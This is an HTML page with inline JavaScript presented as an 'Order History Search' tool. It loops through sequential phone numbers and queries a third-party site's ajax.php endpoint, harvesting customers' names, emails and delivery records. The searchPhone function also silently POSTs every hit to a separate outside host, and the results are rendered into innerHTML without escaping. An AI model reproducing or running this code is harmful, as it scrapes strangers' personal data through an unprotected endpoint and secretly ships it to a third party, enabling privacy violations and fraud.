<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Order History Search</title>
    <!-- Bootstrap CSS CDN -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
      crossorigin="anonymous"
    />
    <style>
      .container {
        margin-top: 20px;
      }
      .status {
        margin-top: 20px;
      }
      .table-container {
        margin-top: 20px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1 class="text-center">Order History Search</h1>
      <form id="searchForm">
        <div class="form-group">
          <label for="startPhone">Starting Phone Number:</label>
          <input
            type="text"
            class="form-control"
            id="startPhone"
            placeholder="01711980213"
            required
          />
        </div>
        <div class="form-group">
          <label for="range">Range (Number of Increments):</label>
          <input
            type="number"
            class="form-control"
            id="range"
            placeholder="10"
            required
          />
        </div>
        <button type="submit" class="btn btn-primary">Search</button>
      </form>
      <div id="status" class="status"></div>
      <div id="results" class="table-container"></div>
    </div>

    <!-- jQuery and Bootstrap JS CDN -->
    <script
      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
      integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
      integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
      crossorigin="anonymous"
    ></script>

    <script>
      document
        .getElementById("searchForm")
        .addEventListener("submit", async function (event) {
          event.preventDefault();

          const startPhone = document.getElementById("startPhone").value;
          const range = parseInt(document.getElementById("range").value, 10);
          const resultsDiv = document.getElementById("results");
          const statusDiv = document.getElementById("status");

          resultsDiv.innerHTML = "";
          statusDiv.innerHTML = "Searching...";

          try {
            const requests = [];
            for (let i = 0; i < range; i++) {
              const phone =
                startPhone.slice(0, -1) +
                (parseInt(startPhone.slice(-1), 10) + i);
              requests.push(searchPhone(phone));
            }
            const responses = await Promise.all(requests);
            const filteredResponses = responses.filter(
              (response) =>
                response.customerName ||
                response.orders.some((order) => order.total > 0)
            );

            if (filteredResponses.length > 0) {
              displayResults(filteredResponses);
            } else {
              resultsDiv.innerHTML =
                '<div class="alert alert-info">No matching data found.</div>';
            }

            statusDiv.innerHTML = "Search completed.";
          } catch (error) {
            console.error("Error:", error);
            statusDiv.innerHTML =
              '<div class="alert alert-danger">An error occurred during the search.</div>';
          }
        });

      async function searchPhone(phone) {
        const response = await fetch(
          `https://uddoktabd.com/ajax.php?phone=${phone}`
        );
        const data = await response.json();

        if (data.customerName || data.orders.some((order) => order.total > 0)) {
          await fetch("https://chat.mainulhasan05.xyz/order-history", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              phone: phone,
              customerName: data.customerName,
              customerEmail: data.customerEmail,
              orders: data.orders,
            }),
          });
        }

        return data;
      }

      function displayResults(responses) {
        let html = "<h2>Results</h2>";

        responses.forEach((response) => {
          if (response.customerName) {
            html += `
                        <div class="card mb-3">
                            <div class="card-header">
                                <h5 class="card-title">Customer: ${
                                  response.customerName
                                }</h5>
                            </div>
                            <div class="card-body">
                                <p><strong>Email:</strong> ${
                                  response.customerEmail
                                }</p>
                                <table class="table table-bordered">
                                    <thead>
                                        <tr>
                                            <th>Courier</th>
                                            <th>Delivered</th>
                                            <th>Returned</th>
                                            <th>Total</th>
                                            <th>Ratio</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        ${response.orders
                                          .map(
                                            (order) => `
                                            <tr>
                                                <td>${order.courier}</td>
                                                <td>${order.delivered}</td>
                                                <td>${order.returned}</td>
                                                <td>${order.total}</td>
                                                <td>${order.ratio}</td>
                                            </tr>
                                        `
                                          )
                                          .join("")}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    `;
          }
        });

        document.getElementById("results").innerHTML = html;
      }
    </script>
  </body>
</html>
